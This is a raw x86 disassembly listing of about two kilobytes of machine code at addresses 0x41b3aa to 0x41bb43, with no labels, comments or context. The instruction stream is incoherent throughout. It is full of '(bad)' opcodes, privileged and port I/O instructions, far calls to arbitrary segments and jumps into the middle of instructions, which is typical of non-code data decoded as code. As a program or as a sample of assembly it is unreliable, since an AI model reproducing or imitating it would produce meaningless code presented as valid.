  41b3aa:	push   eax
  41b3ab:	fistp  DWORD PTR [ebx-0x53]
  41b3ae:	dec    ebp
  41b3af:	pop    esi
  41b3b0:	jnp    0x41b385
  41b3b2:	icebp  
  41b3b3:	sbb    al,0x5
  41b3b5:	inc    eax
  41b3b6:	pop    ds
  41b3b7:	cwde   
  41b3b8:	scas   eax,DWORD PTR es:[edi]
  41b3b9:	shl    DWORD PTR [ecx+0x1a],cl
  41b3bc:	inc    esi
  41b3bd:	adc    DWORD PTR ds:0x6f98e94a,ecx
  41b3c3:	mov    edx,0x9f45cee4
  41b3c8:	mov    edi,0x2021875a
  41b3cd:	push   ss
  41b3ce:	mov    ds:0x34f78907,al
  41b3d3:	lahf   
  41b3d4:	cwde   
  41b3d5:	(bad)  
  41b3d6:	mov    ebx,0xf22967d3
  41b3db:	fwait
  41b3dc:	out    0xe2,al
  41b3de:	fcom   DWORD PTR [ebp+0x0]
  41b3e1:	adc    dh,BYTE PTR [edi-0x28]
  41b3e4:	xchg   ebx,eax
  41b3e5:	xor    dh,BYTE PTR [eax]
  41b3e7:	rcl    edi,cl
  41b3e9:	pop    edi
  41b3ea:	push   edi
  41b3eb:	xchg   esi,eax
  41b3ec:	dec    edi
  41b3ed:	jl     0x41b38a
  41b3ef:	popf   
  41b3f0:	xchg   ecx,eax
  41b3f1:	sahf   
  41b3f2:	mov    ch,0xf2
  41b3f4:	dec    eax
  41b3f5:	hlt    
  41b3f6:	xchg   edi,eax
  41b3f7:	push   ds
  41b3f8:	loope  0x41b383
  41b3fa:	fnstenv [edi-0x7eff75db]
  41b400:	mov    eax,0xd6df6e16
  41b405:	adc    dh,cl
  41b407:	fsub   st(3),st
  41b409:	xor    cl,BYTE PTR [ecx+esi*8-0x19]
  41b40d:	in     eax,0x29
  41b40f:	enter  0xf88d,0x5f
  41b413:	lock sub dl,BYTE PTR [edi+0x28]
  41b417:	gs fsubrp st(3),st
  41b41a:	sti    
  41b41b:	stos   BYTE PTR es:[edi],al
  41b41c:	dec    edi
  41b41d:	mov    ebp,0xa1cc8c57
  41b422:	pop    ds
  41b423:	gs adc eax,0xcdb3858d
  41b429:	pop    edi
  41b42a:	mov    ds:0xadacc068,eax
  41b42f:	mov    ah,0xca
  41b431:	out    0x2d,al
  41b433:	cmp    eax,0x2296a761
  41b438:	inc    edx
  41b439:	and    DWORD PTR [ebp+0xbf79d1],ebx
  41b43f:	cmp    BYTE PTR [eax-0x49711adf],bh
  41b445:	mov    edi,0x41bf51f9
  41b44a:	add    bl,BYTE PTR [edx-0x3858fe9b]
  41b450:	iret   
  41b451:	xchg   edi,eax
  41b452:	mov    WORD PTR [edi+ecx*2-0x5d70c5c6],ds
  41b459:	mov    esi,0xa70afb4
  41b45e:	leave  
  41b45f:	cdq    
  41b460:	call   0xbffc:0x53b5cfb
  41b467:	mov    ds:0x8f125ce3,eax
  41b46c:	or     BYTE PTR [ecx+0x16],ah
  41b46f:	stos   BYTE PTR es:[edi],al
  41b470:	mov    ah,0x9b
  41b472:	inc    eax
  41b473:	xor    BYTE PTR [edx-0x1264c9f9],bl
  41b479:	clc    
  41b47a:	pushf  
  41b47b:	mov    ecx,0xc31d5736
  41b480:	mov    dh,0x6c
  41b482:	push   ebx
  41b483:	sub    eax,edi
  41b485:	enter  0xca6f,0x89
  41b489:	sbb    al,0x89
  41b48b:	loopne 0x41b4a5
  41b48d:	ds jae 0x41b455
  41b490:	scas   eax,DWORD PTR es:[edi]
  41b491:	jnp    0x41b4a1
  41b493:	and    al,0x50
  41b495:	jl     0x41b43b
  41b497:	mov    es,WORD PTR [esi]
  41b499:	mov    bh,0x98
  41b49b:	inc    esp
  41b49c:	push   ds
  41b49d:	arpl   bx,bp
  41b49f:	aaa    
  41b4a0:	adc    esi,ebp
  41b4a2:	out    0xe1,eax
  41b4a4:	jae    0x41b498
  41b4a6:	mov    ecx,DWORD PTR [ecx+esi*4+0x37b31f91]
  41b4ad:	icebp  
  41b4ae:	inc    eax
  41b4af:	sbb    eax,0xe35b4eac
  41b4b4:	mov    esp,0x986502d8
  41b4b9:	int    0x90
  41b4bb:	xor    eax,0x73be785
  41b4c0:	pop    esi
  41b4c1:	add    eax,0xbf131d03
  41b4c6:	call   0x90297a
  41b4cb:	int    0xd1
  41b4cd:	outs   dx,DWORD PTR ds:[esi]
  41b4ce:	push   esp
  41b4cf:	and    BYTE PTR [edi-0x40],ah
  41b4d2:	dec    edi
  41b4d3:	xchg   ecx,eax
  41b4d4:	in     al,0x2
  41b4d6:	nop
  41b4d7:	lods   al,BYTE PTR ds:[esi]
  41b4d8:	(bad)  
  41b4d9:	xchg   esi,eax
  41b4da:	adc    BYTE PTR cs:[ecx-0x2c],bh
  41b4de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4e0:	xchg   DWORD PTR [edi-0x3f],ebp
  41b4e3:	mov    ch,0x50
  41b4e5:	mov    esp,0x7d1172e1
  41b4ea:	ror    BYTE PTR [esp+edx*1-0x10],1
  41b4ee:	sub    DWORD PTR [eax-0x14ebd683],ebx
  41b4f4:	mov    bh,0x16
  41b4f6:	mov    eax,ds:0x5c886141
  41b4fb:	fldenv [ecx]
  41b4fd:	jp     0x41b4f7
  41b4ff:	test   DWORD PTR [eax],esp
  41b501:	or     dl,dl
  41b503:	inc    edx
  41b504:	mov    BYTE PTR [esp+ebp*4-0x25],ah
  41b508:	cmp    al,BYTE PTR [esi+esi*2]
  41b50b:	fistp  QWORD PTR [eax-0x15]
  41b50e:	mov    edx,es
  41b510:	pop    edi
  41b511:	test   al,0x37
  41b513:	stos   BYTE PTR es:[edi],al
  41b514:	fstp   QWORD PTR ds:0x87acc665
  41b51a:	pop    eax
  41b51b:	int3   
  41b51c:	out    0x87,al
  41b51e:	and    BYTE PTR [ebx],al
  41b520:	sti    
  41b521:	pop    edi
  41b522:	out    0x29,al
  41b524:	sub    esi,DWORD PTR [eax+edi*1-0x49e27033]
  41b52b:	inc    eax
  41b52c:	(bad)  
  41b52d:	mov    ecx,0xedc6471c
  41b532:	sub    al,0xe7
  41b534:	scas   eax,DWORD PTR es:[edi]
  41b535:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b536:	jnp    0x41b56d
  41b538:	cmp    bl,BYTE PTR [ecx+0x32bb7729]
  41b53e:	imul   eax,ebp,0x619b1542
  41b544:	scas   al,BYTE PTR es:[edi]
  41b545:	or     eax,0x99c75dfd
  41b54a:	test   BYTE PTR [eax+0x68b2ebdc],cl
  41b550:	test   eax,0xa0bdabe7
  41b555:	add    BYTE PTR [edx-0xa],dl
  41b558:	pop    esi
  41b559:	or     esp,0x7f21c551
  41b55f:	out    dx,al
  41b560:	sbb    edx,DWORD PTR [esp+eiz*4+0x5066f623]
  41b567:	fstp   QWORD PTR [eax+ebp*2]
  41b56a:	mov    edi,ss
  41b56c:	xor    DWORD PTR [ecx-0x4683efc3],eax
  41b572:	cdq    
  41b573:	les    eax,FWORD PTR [eax]
  41b575:	xlat   BYTE PTR ds:[ebx]
  41b576:	movsx  eax,al
  41b579:	push   eax
  41b57a:	in     eax,dx
  41b57b:	scas   eax,DWORD PTR es:[edi]
  41b57c:	fidivr WORD PTR [edx-0x19]
  41b57f:	push   ds
  41b580:	adc    DWORD PTR [ecx+esi*8-0x27117a3d],edx
  41b587:	mov    edi,0x705d6dc5
  41b58c:	dec    di
  41b58e:	inc    edx
  41b58f:	fsubr  st(5),st
  41b591:	ret    0x449e
  41b594:	test   eax,0xcb98f7ef
  41b599:	lock (bad) 
  41b59b:	outs   dx,BYTE PTR ds:[esi]
  41b59c:	jle    0x41b5db
  41b59e:	and    ch,0x68
  41b5a1:	fstp   TBYTE PTR [edx+0x5c]
  41b5a4:	pushf  
  41b5a5:	and    ch,BYTE PTR [ecx+0x6]
  41b5a8:	jp     0x41b5c9
  41b5aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5ab:	sbb    eax,0xb7c49483
  41b5b0:	jg     0x41b61d
  41b5b2:	and    al,0xda
  41b5b4:	xchg   ebp,eax
  41b5b5:	sbb    BYTE PTR [edx-0x40],0x17
  41b5b9:	lods   eax,DWORD PTR ds:[esi]
  41b5ba:	sub    esi,edx
  41b5bc:	jecxz  0x41b565
  41b5be:	mov    bh,0x3
  41b5c0:	mov    ecx,0xa08960e9
  41b5c5:	and    ebp,0xee3575f7
  41b5cb:	repnz sahf 
  41b5cd:	stos   BYTE PTR es:[edi],al
  41b5ce:	or     eax,0x56fb7341
  41b5d3:	pop    eax
  41b5d4:	(bad)  
  41b5d5:	push   0xfffffffc
  41b5d7:	out    0x22,eax
  41b5d9:	test   eax,0xa66d8bbd
  41b5de:	les    ecx,FWORD PTR [esi-0x36]
  41b5e1:	cld    
  41b5e2:	fcomp  DWORD PTR [ebp-0x70]
  41b5e5:	mov    esi,0x71d2e64d
  41b5ea:	push   ecx
  41b5eb:	jl     0x41b63c
  41b5ed:	cmp    eax,0xc898c35b
  41b5f2:	mov    eax,0x4adf0f33
  41b5f7:	jne    0x41b5f1
  41b5f9:	jae    0x41b618
  41b5fb:	push   ebp
  41b5fc:	xchg   BYTE PTR [ecx+0x6b],dh
  41b5ff:	test   al,0x52
  41b601:	or     DWORD PTR [ebp+esi*4-0x5b],ebp
  41b605:	int3   
  41b606:	jae    0x41b660
  41b608:	push   cs
  41b609:	inc    edx
  41b60a:	xor    al,0xbb
  41b60c:	jmp    0x9f36:0x93e5f2b9
  41b613:	neg    BYTE PTR [ecx+0x77ca2f9e]
  41b619:	push   0x50e81708
  41b61e:	in     eax,dx
  41b61f:	xor    BYTE PTR ds:0x8892d83f,dh
  41b625:	pop    es
  41b626:	sbb    al,0xb5
  41b628:	outs   dx,BYTE PTR ds:[esi]
  41b629:	jge    0x41b60c
  41b62b:	repz mov eax,ds:0x24854406
  41b631:	add    DWORD PTR [ecx],ebp
  41b633:	icebp  
  41b634:	(bad)  
  41b635:	sbb    ebx,ecx
  41b637:	pop    esi
  41b638:	xchg   BYTE PTR [ebx+0x79798bf0],bl
  41b63e:	scas   eax,DWORD PTR es:[edi]
  41b63f:	jmp    0x41b695
  41b641:	rcl    dh,0xac
  41b644:	push   esp
  41b645:	push   ss
  41b646:	cwde   
  41b647:	and    esp,esp
  41b649:	jno    0x41b681
  41b64b:	(bad)  
  41b64c:	mov    esi,0x9670678c
  41b651:	ret    0x43ba
  41b654:	inc    esi
  41b655:	test   BYTE PTR [esi+edx*2+0x3ac82219],cl
  41b65c:	sbb    BYTE PTR [eax+edi*4+0x54f486ca],cl
  41b663:	jmp    0xd37e:0xbfb01d65
  41b66a:	cs lahf 
  41b66c:	sub    bl,ch
  41b66e:	out    dx,al
  41b66f:	sar    DWORD PTR [ebx],0x4c
  41b672:	xchg   edi,eax
  41b673:	rep lods eax,DWORD PTR ds:[esi]
  41b675:	push   ds
  41b676:	mov    ebp,DWORD PTR [ecx-0x7056e5f]
  41b67c:	jmp    0x41b6ad
  41b67e:	sar    DWORD PTR [edi+0x7dada280],0xb0
  41b685:	ret    0x9930
  41b688:	jl     0x41b669
  41b68a:	pop    ss
  41b68b:	or     BYTE PTR [ebp-0x25c4d2ff],bl
  41b691:	add    al,dl
  41b693:	jge    0x41b6b8
  41b695:	nop
  41b696:	sar    BYTE PTR [ecx+eax*1-0x6c6df3d0],1
  41b69d:	xor    al,0x6d
  41b69f:	lock or BYTE PTR ds:0x524fb2b7,bl
  41b6a6:	fmul   QWORD PTR [edi]
  41b6a8:	popa   
  41b6a9:	fs sbb ecx,ecx
  41b6ac:	pop    esp
  41b6ad:	test   BYTE PTR ds:0x5ba4aa3a,ah
  41b6b3:	lea    edi,[ecx+0x6e7a6497]
  41b6b9:	sbb    DWORD PTR [edi-0x63931d2c],ebx
  41b6bf:	add    ah,BYTE PTR [ecx+0x31360364]
  41b6c5:	test   ebp,edx
  41b6c7:	je     0x41b6a4
  41b6c9:	aam    0xe8
  41b6cb:	lahf   
  41b6cc:	hlt    
  41b6cd:	shl    BYTE PTR [esi-0x219cd30d],cl
  41b6d3:	or     eax,DWORD PTR [edx+0x51]
  41b6d6:	in     al,dx
  41b6d7:	enter  0xcd9,0xb6
  41b6db:	(bad)  
  41b6dc:	cmc    
  41b6dd:	int3   
  41b6de:	ror    BYTE PTR es:[ecx+ebx*8-0x42],0x4b
  41b6e4:	add    DWORD PTR [edx-0x23],edx
  41b6e7:	adc    ebx,0x4c
  41b6ea:	stos   DWORD PTR es:[edi],eax
  41b6eb:	push   eax
  41b6ec:	ret    0xcadd
  41b6ef:	nop
  41b6f0:	punpckhdq mm4,QWORD PTR [edi-0x61]
  41b6f4:	out    0xf1,eax
  41b6f6:	loopne 0x41b76b
  41b6f8:	jmp    0x41b680
  41b6fa:	mov    ebp,0xdcbbfbb
  41b6ff:	jle    0x41b70f
  41b701:	mov    DWORD PTR [ebx+eax*2],0x3168f91c
  41b708:	mov    WORD PTR [ecx],es
  41b70a:	mov    dh,0x68
  41b70c:	nop
  41b70d:	pusha  
  41b70e:	push   cs
  41b70f:	aas    
  41b710:	les    ebp,FWORD PTR [ecx+edx*2-0x23]
  41b714:	gs push es
  41b716:	test   DWORD PTR [edx-0x73],eax
  41b719:	inc    ebp
  41b71a:	enter  0xa85d,0x2b
  41b71e:	push   0xfc8533a9
  41b723:	jo     0x41b774
  41b725:	repz or cl,BYTE PTR [edx+0x7c4d4569]
  41b72c:	sbb    bl,BYTE PTR [ebx+eiz*2+0xc8db1bf]
  41b733:	xor    DWORD PTR [edi+0x1a],0xb303c946
  41b73a:	stos   DWORD PTR es:[edi],eax
  41b73b:	jmp    edi
  41b73d:	getsec 
  41b73f:	push   es
  41b740:	call   0xb9c24209
  41b745:	bnd jo 0x41b753
  41b748:	dec    eax
  41b749:	pusha  
  41b74a:	fidivr DWORD PTR [ecx]
  41b74c:	rcr    BYTE PTR [esi],cl
  41b74e:	retf   0xc1
  41b751:	adc    BYTE PTR [esi+0x20],ah
  41b754:	fld    TBYTE PTR [ecx+0x227aab8c]
  41b75a:	push   eax
  41b75b:	nop
  41b75c:	je     0x41b7b6
  41b75e:	ja     0x41b71b
  41b760:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b761:	xchg   ebp,eax
  41b762:	call   DWORD PTR [di+0x8]
  41b766:	lods   eax,DWORD PTR ds:[esi]
  41b767:	imul   edi,DWORD PTR [edx+edx*1],0x6d90623
  41b76e:	xlat   BYTE PTR ds:[ebx]
  41b76f:	adc    DWORD PTR [esp+ecx*4+0x58],ecx
  41b773:	jge    0x41b70c
  41b775:	cmc    
  41b776:	push   ecx
  41b777:	cmp    DWORD PTR ds:0x899dad01,0xc5a4381f
  41b781:	aas    
  41b782:	ret    0xb1d4
  41b785:	das    
  41b786:	mov    esp,0x2492b9d0
  41b78b:	jecxz  0x41b7f4
  41b78d:	mov    ecx,0xdb8b31a
  41b792:	in     eax,0x3d
  41b794:	push   ebx
  41b795:	xchg   ecx,eax
  41b796:	test   eax,0xe4fc2f96
  41b79b:	ret    0xa4f0
  41b79e:	rcr    ecx,cl
  41b7a0:	pop    eax
  41b7a1:	mov    DWORD PTR [edi+0x7c],0x5f1ce832
  41b7a8:	jnp    0x41b7f5
  41b7aa:	arpl   ax,bp
  41b7ac:	jae    0x41b81f
  41b7ae:	sbb    BYTE PTR [esi+0x69],dl
  41b7b1:	sub    ah,BYTE PTR [esi+0x69]
  41b7b4:	jge    0x41b7e1
  41b7b6:	xchg   esp,eax
  41b7b7:	jp     0x41b7a9
  41b7b9:	test   DWORD PTR [ebx-0x635d6a5a],eax
  41b7bf:	clc    
  41b7c0:	cmp    DWORD PTR [eax+ebx*4],ebp
  41b7c3:	shr    BYTE PTR [esp+edi*1],cl
  41b7c6:	add    eax,0x43a5154
  41b7cb:	push   ebp
  41b7cc:	add    DWORD PTR [edi-0x5d],esi
  41b7cf:	push   esp
  41b7d0:	push   cs
  41b7d1:	cmp    BYTE PTR [eax+0x50d8530e],ah
  41b7d7:	xchg   esp,eax
  41b7d8:	mov    ecx,0x1a06ac45
  41b7dd:	outs   dx,DWORD PTR ds:[esi]
  41b7de:	ss call 0x7db12bd
  41b7e4:	stos   DWORD PTR es:[edi],eax
  41b7e5:	mov    DWORD PTR [eax],ebx
  41b7e7:	jae    0x41b794
  41b7e9:	jecxz  0x41b774
  41b7eb:	and    al,0x93
  41b7ed:	test   DWORD PTR [ebp+0x4effbaf5],eax
  41b7f3:	cmp    eax,0x2017a3
  41b7f8:	mov    ah,0x9e
  41b7fa:	lods   eax,DWORD PTR ds:[esi]
  41b7fb:	or     edx,edi
  41b7fd:	and    al,0xc9
  41b7ff:	jecxz  0x41b7bd
  41b801:	sbb    ch,BYTE PTR [ecx-0x7e]
  41b804:	cwde   
  41b805:	test   eax,0x154643e8
  41b80a:	aam    0xb2
  41b80c:	push   ss
  41b80d:	jo     0x41b7a5
  41b80f:	add    edx,0xa5ecc3d1
  41b815:	mov    esp,0xfedda7ae
  41b81a:	add    DWORD PTR [eax+0x27179c07],0x447a519e
  41b824:	hlt    
  41b825:	ficom  WORD PTR [eax+0x6bfc53be]
  41b82b:	pushf  
  41b82c:	cmp    al,0xa0
  41b82e:	loope  0x41b87b
  41b830:	scas   eax,DWORD PTR es:[edi]
  41b831:	and    esp,DWORD PTR [edx+edi*4-0x53]
  41b835:	adc    al,0x47
  41b837:	add    edx,DWORD PTR [eax]
  41b839:	pusha  
  41b83a:	cdq    
  41b83b:	sub    eax,0x93efb21b
  41b840:	sbb    BYTE PTR [eax+0x754d8833],ch
  41b846:	sbb    DWORD PTR [edx-0x49],0x3b9dadda
  41b84d:	jne    0x41b8c9
  41b84f:	inc    ebp
  41b850:	(bad)  
  41b851:	fisttp QWORD PTR [ebx+0x5b]
  41b854:	jmp    0x41b7de
  41b856:	and    BYTE PTR [edx],ah
  41b858:	xor    al,0xc2
  41b85a:	mov    bh,0xc9
  41b85c:	inc    edx
  41b85d:	inc    esi
  41b85e:	xor    BYTE PTR [ebx],ah
  41b860:	ins    DWORD PTR es:[edi],dx
  41b861:	nop
  41b862:	lods   eax,DWORD PTR ds:[esi]
  41b863:	fistp  WORD PTR [edx+0x72]
  41b866:	lods   al,BYTE PTR ds:[esi]
  41b867:	rcl    dh,0x46
  41b86a:	imul   ebx,DWORD PTR [edi+0x75],0x6c
  41b86e:	call   0x2fae:0xe49a0b11
  41b875:	fld    QWORD PTR [esi-0x3a]
  41b878:	jp     0x41b8a5
  41b87a:	sub    dh,ch
  41b87c:	dec    esi
  41b87d:	(bad)  
  41b87e:	jmp    0xe974eca4
  41b883:	mov    ch,0xe
  41b885:	fbstp  TBYTE PTR [edi-0x47]
  41b888:	push   0xffffff94
  41b88a:	out    0x74,eax
  41b88c:	sahf   
  41b88d:	and    al,0x55
  41b88f:	cmp    al,0xed
  41b891:	out    0x12,al
  41b893:	mov    ch,0x4f
  41b895:	je     0x41b8d8
  41b897:	dec    ebx
  41b898:	push   es
  41b899:	lea    eax,[eax-0x78]
  41b89c:	xor    DWORD PTR ds:0xfc11daf5,edx
  41b8a2:	repnz icebp 
  41b8a4:	lea    esi,[edi+0x34172afe]
  41b8aa:	jb     0x41b86e
  41b8ac:	and    edi,DWORD PTR [ebp-0x7e]
  41b8af:	xchg   esp,eax
  41b8b0:	mov    dh,BYTE PTR [eax-0x44e685d6]
  41b8b6:	jae    0x41b8b4
  41b8b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8b9:	nop
  41b8ba:	imul   ebx,DWORD PTR [ebp+0x43],0xb6a73453
  41b8c1:	inc    eax
  41b8c2:	inc    esi
  41b8c3:	sbb    eax,0x877b176e
  41b8c8:	ror    BYTE PTR [esi-0x7c],1
  41b8cb:	mov    BYTE PTR [edx],dh
  41b8cd:	lods   al,BYTE PTR ds:[esi]
  41b8ce:	sbb    al,0xff
  41b8d0:	outs   dx,DWORD PTR ds:[esi]
  41b8d1:	push   ecx
  41b8d2:	sub    ebx,DWORD PTR [edi-0x47b158ca]
  41b8d8:	stos   BYTE PTR es:[edi],al
  41b8d9:	out    0x2c,al
  41b8db:	enter  0x1f7c,0xa
  41b8df:	in     eax,dx
  41b8e0:	sub    BYTE PTR [ecx+0x70d729d3],0x60
  41b8e7:	int3   
  41b8e8:	jecxz  0x41b88a
  41b8ea:	inc    ecx
  41b8eb:	call   0x932e:0x9c3bcd48
  41b8f2:	cdq    
  41b8f3:	retf   0x2e8
  41b8f6:	dec    edi
  41b8f7:	or     ah,BYTE PTR [eax+ebp*4]
  41b8fa:	mov    esp,0xda72ade5
  41b8ff:	push   ebx
  41b900:	adc    eax,0x5854e0d
  41b905:	es jl  0x41b899
  41b908:	cmp    dh,BYTE PTR [ebp+0x27]
  41b90b:	jnp    0x41b949
  41b90d:	adc    BYTE PTR [ecx],bh
  41b90f:	js     0x41b8fe
  41b911:	out    0xb2,al
  41b913:	lods   eax,DWORD PTR ds:[esi]
  41b914:	or     DWORD PTR [ecx-0x555df648],0xa6fa362d
  41b91e:	xchg   esp,eax
  41b91f:	scas   eax,DWORD PTR es:[edi]
  41b920:	sub    eax,0x13aacb7b
  41b925:	mov    al,0xd3
  41b927:	ret    
  41b928:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b929:	daa    
  41b92a:	test   eax,0xb3f0c1ef
  41b92f:	push   eax
  41b930:	je     0x41b8c8
  41b932:	mov    ebx,0x5281159d
  41b937:	pushf  
  41b938:	aam    0x32
  41b93a:	inc    edi
  41b93b:	sub    ecx,edi
  41b93d:	xchg   edx,eax
  41b93e:	call   0x3a1be014
  41b943:	shr    eax,1
  41b945:	rcr    BYTE PTR [ebx-0x20],0xb2
  41b949:	std    
  41b94a:	pop    esp
  41b94b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b94c:	mov    al,0xb4
  41b94e:	add    eax,0x879bd9d8
  41b953:	int    0xed
  41b955:	inc    esi
  41b956:	mov    bl,0xa0
  41b958:	inc    edx
  41b959:	test   eax,0x9ebff22e
  41b95e:	mov    ds:0x53811ab3,al
  41b963:	aaa    
  41b964:	enter  0x4906,0xa0
  41b968:	adc    ch,cl
  41b96a:	into   
  41b96b:	add    al,0x63
  41b96d:	pushf  
  41b96e:	mov    ch,BYTE PTR [ebx+0x505b1d42]
  41b974:	cmp    eax,0x526e49f3
  41b979:	and    eax,esi
  41b97b:	clc    
  41b97c:	aad    0x38
  41b97e:	push   ss
  41b97f:	push   es
  41b980:	push   edi
  41b981:	mov    bh,bh
  41b983:	ds mov dl,0xdd
  41b986:	shl    BYTE PTR [edi+ebx*2+0x62],cl
  41b98a:	sub    ch,BYTE PTR [ebp+0x26]
  41b98d:	adc    DWORD PTR [ecx+0x5d],eax
  41b990:	not    ebp
  41b992:	scas   eax,DWORD PTR es:[edi]
  41b993:	push   edx
  41b994:	out    0x66,al
  41b996:	cld    
  41b997:	repz pop ds
  41b999:	mov    ebx,0xb97072c3
  41b99e:	push   ss
  41b99f:	jno    0x41b9de
  41b9a1:	pop    esp
  41b9a2:	ins    DWORD PTR es:[edi],dx
  41b9a3:	sub    bh,al
  41b9a5:	add    ah,BYTE PTR [edi+0x4d]
  41b9a8:	test   BYTE PTR [edi],0x12
  41b9ab:	adc    esi,DWORD PTR [eax]
  41b9ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9ae:	jno    0x41b955
  41b9b0:	xor    DWORD PTR [edx],esp
  41b9b2:	addr16 mov cl,0x95
  41b9b5:	arpl   WORD PTR [eax+0x1e78c78f],di
  41b9bb:	and    ebx,edx
  41b9bd:	pop    ebp
  41b9be:	out    0xbd,eax
  41b9c0:	loope  0x41b9b7
  41b9c2:	pop    DWORD PTR [ecx+ebx*2]
  41b9c5:	sub    edx,DWORD PTR [esi+0x2]
  41b9c8:	jns    0x41b9e1
  41b9ca:	dec    esp
  41b9cb:	mov    ds:0x83e74b87,al
  41b9d0:	stc    
  41b9d1:	xchg   ebx,eax
  41b9d2:	fsub   DWORD PTR [eax-0x80]
  41b9d5:	pop    eax
  41b9d6:	mov    eax,ds:0x1a274a1f
  41b9db:	bound  edx,QWORD PTR [ebx+0x0]
  41b9de:	imul   ebp,DWORD PTR [edx+0x39],0x77d7c573
  41b9e5:	aas    
  41b9e6:	gs arpl dx,ax
  41b9e9:	ret    0xd796
  41b9ec:	and    eax,0x2b4cc059
  41b9f1:	in     eax,0x6e
  41b9f3:	pop    esp
  41b9f4:	not    BYTE PTR [ebx*1+0x4f012fd1]
  41b9fb:	mov    cs,WORD PTR [ebx-0x2c4ece38]
  41ba01:	retf   
  41ba02:	cmp    eax,DWORD PTR [ebx]
  41ba04:	mov    eax,ds:0x2f13ef4f
  41ba0a:	or     bl,cl
  41ba0c:	outs   dx,DWORD PTR ds:[esi]
  41ba0d:	mov    esp,0x58ed61e9
  41ba12:	mov    eax,ds:0x513f714a
  41ba17:	stos   DWORD PTR es:[edi],eax
  41ba18:	mov    ebx,0xaa1761be
  41ba1d:	mov    bl,bh
  41ba1f:	sbb    DWORD PTR [ebx+0xedb2899],0x7c1bae6e
  41ba29:	cmp    eax,0xcff3f828
  41ba2e:	xchg   edx,ebp
  41ba30:	outs   dx,DWORD PTR ds:[esi]
  41ba31:	or     edi,edx
  41ba33:	pop    ds
  41ba34:	mov    ebx,0xb1883e2b
  41ba39:	jg     0x41ba1f
  41ba3b:	sub    bh,BYTE PTR [esi-0x68]
  41ba3e:	jns    0x41b9d7
  41ba40:	popf   
  41ba41:	es adc ebp,eax
  41ba44:	xchg   edx,eax
  41ba45:	aad    0x98
  41ba47:	loop   0x41ba52
  41ba49:	je     0x41ba67
  41ba4b:	fst    DWORD PTR fs:[ecx-0x7d]
  41ba4f:	sub    cl,ah
  41ba51:	dec    ecx
  41ba52:	or     al,0x24
  41ba54:	mov    eax,0x631c2016
  41ba59:	loopne 0x41ba7e
  41ba5b:	mov    ch,0x9a
  41ba5d:	xor    esi,0xffffffe4
  41ba60:	pop    edi
  41ba61:	mov    al,0x62
  41ba63:	aaa    
  41ba64:	dec    ebp
  41ba65:	data16 xor bh,BYTE PTR ds:0x8a8bd1ea
  41ba6c:	cmp    ch,cl
  41ba6e:	cmp    WORD PTR [eax+0x45b62fce],sp
  41ba75:	fwait
  41ba76:	imul   DWORD PTR [esi+0x58]
  41ba79:	scas   eax,DWORD PTR es:[edi]
  41ba7a:	clc    
  41ba7b:	push   ebx
  41ba7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba7d:	and    BYTE PTR [ecx+ecx*8+0x49eb60d8],bh
  41ba84:	mov    ebx,0x9ec3941e
  41ba89:	ds sub eax,0x40f29e0f
  41ba8f:	mov    eax,ds:0xf7c3a160
  41ba94:	jp     0x41ba84
  41ba96:	jnp    0x41ba31
  41ba98:	jmp    0x41ba6f
  41ba9a:	mov    DWORD PTR [esi],edi
  41ba9c:	aad    0xc2
  41ba9e:	iret   
  41ba9f:	inc    esi
  41baa0:	popa   
  41baa1:	test   BYTE PTR [edx+0x5c],bh
  41baa4:	iret   
  41baa5:	sahf   
  41baa6:	sub    BYTE PTR [ebp+0x2f],bh
  41baa9:	pop    ss
  41baaa:	jp     0x41bada
  41baac:	repz enter 0xfb1a,0xe4
  41bab1:	sbb    al,BYTE PTR [ebp+0x23426326]
  41bab7:	cdq    
  41bab8:	hlt    
  41bab9:	scas   al,BYTE PTR es:[edi]
  41baba:	nop
  41babb:	push   ss
  41babc:	cmp    BYTE PTR [edi+0x3],al
  41babf:	xor    WORD PTR [edi],dx
  41bac2:	cs and ebx,ebp
  41bac5:	(bad)  
  41bac6:	clc    
  41bac7:	mov    cl,0x1f
  41bac9:	aas    
  41baca:	cmp    BYTE PTR [ebx],dl
  41bacc:	out    0x76,eax
  41bace:	jae    0x41ba6b
  41bad0:	add    al,0x91
  41bad2:	ror    edx,1
  41bad4:	test   DWORD PTR [edx-0x4e1b3b7e],ecx
  41bada:	call   0xa00c:0xc747fe
  41bae1:	lahf   
  41bae2:	fsubr  QWORD PTR [bp+si+0x7c34]
  41bae7:	das    
  41bae8:	std    
  41bae9:	xor    eax,edx
  41baeb:	sub    DWORD PTR [eax+eiz*2-0x62],ebp
  41baef:	xchg   ecx,eax
  41baf0:	in     eax,0x93
  41baf2:	sti    
  41baf3:	ss cli 
  41baf5:	and    eax,0xd3672333
  41bafa:	(bad)  
  41bafb:	or     eax,0x6e14c9f8
  41bb00:	mov    DWORD PTR [ecx],edx
  41bb02:	xchg   edx,eax
  41bb03:	inc    edi
  41bb04:	int3   
  41bb05:	cmp    al,0x8d
  41bb07:	gs sahf 
  41bb09:	lods   eax,DWORD PTR ds:[esi]
  41bb0a:	dec    ecx
  41bb0b:	arpl   si,dx
  41bb0d:	sub    cl,BYTE PTR [eax]
  41bb0f:	pop    esi
  41bb10:	(bad)  [edi+0x4389210c]
  41bb16:	call   0x440f6e9
  41bb1b:	out    0x96,al
  41bb1d:	lahf   
  41bb1e:	leave  
  41bb1f:	arpl   si,sp
  41bb21:	xchg   ebx,eax
  41bb22:	fcomp  QWORD PTR [edi]
  41bb24:	js     0x41badb
  41bb26:	and    ecx,DWORD PTR [ebx-0x44d656eb]
  41bb2c:	mov    ch,0xe7
  41bb2e:	add    ebp,DWORD PTR [eax]
  41bb30:	js     0x41bb49
  41bb32:	inc    esp
  41bb33:	imul   ebp,eax,0x7f
  41bb36:	inc    ebx
  41bb37:	es mov ah,0xb7
  41bb3a:	jo     0x41bb71
  41bb3c:	mov    al,0x68
  41bb3e:	mov    BYTE PTR [bp+0x17],ch
  41bb42:	inc    esi
  41bb43:	cmp    dl,ah
